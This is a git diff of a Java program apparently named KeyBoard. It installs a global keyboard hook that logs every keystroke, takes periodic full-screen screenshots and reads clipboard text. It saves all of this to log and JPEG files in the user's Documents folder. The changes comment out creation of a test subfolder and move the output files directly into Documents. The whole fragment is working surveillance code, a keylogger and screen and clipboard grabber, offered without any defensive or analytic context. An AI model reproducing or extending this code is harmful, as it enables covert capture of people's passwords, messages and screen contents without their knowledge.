@@ -41,11 +41,13 @@ public class KeyBoard implements NativeKeyListener{
         input += "Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n";
     }
     public static void main(String[] args) throws NativeHookException {
+        /*
         File dir = new File(System.getProperty("user.home"), "Documents/test");
         File dir1 = new File(System.getProperty("user.home"), "Documents/test/image");
 
         dir.mkdirs();
         dir1.mkdirs();
+        */
         GlobalScreen.registerNativeHook();
         GlobalScreen.addNativeKeyListener(new KeyBoard());
         Timer timer = new Timer();
@@ -57,7 +59,7 @@ public class KeyBoard implements NativeKeyListener{
                     Robot robot = new Robot();
                     Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                     BufferedImage screenshot = robot.createScreenCapture(screenRect);
-                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", ("test/image/"+System.currentTimeMillis())+".jpeg");
+                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", (System.currentTimeMillis())+".jpeg");
                     File output = LOG_FILE.toFile();
                     ImageIO.write(screenshot, "jpeg", output);
                 } catch (AWTException | IOException e) {
@@ -84,7 +86,7 @@ public class KeyBoard implements NativeKeyListener{
                     } else {
                         System.out.println("Clipboard does not contain text.");
                     }
-                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", "test/log.txt");
+                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", "log.txt");
                     Files.writeString(
                     LOG_FILE, 
                     input, 
